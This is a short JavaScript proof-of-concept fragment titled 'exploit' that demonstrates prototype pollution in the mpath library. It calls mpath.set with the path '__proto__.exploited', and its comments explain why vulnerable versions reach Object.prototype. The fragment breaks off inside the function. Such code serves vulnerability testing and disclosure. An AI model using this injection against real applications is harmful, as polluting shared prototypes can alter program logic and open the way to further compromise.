async function exploit() {
  // Initialize a clean object context for path traversal simulation
  const targetObj = {};

  // Inject '__proto__' (or 'constructor.prototype') into the path string.
  // In vulnerable versions, mpath's path parser treats this as a normal segment
  // and traverses to Object.prototype instead of creating a nested property.
  mpath.set(targetObj, '__proto__.exploited', 'polluted_value');

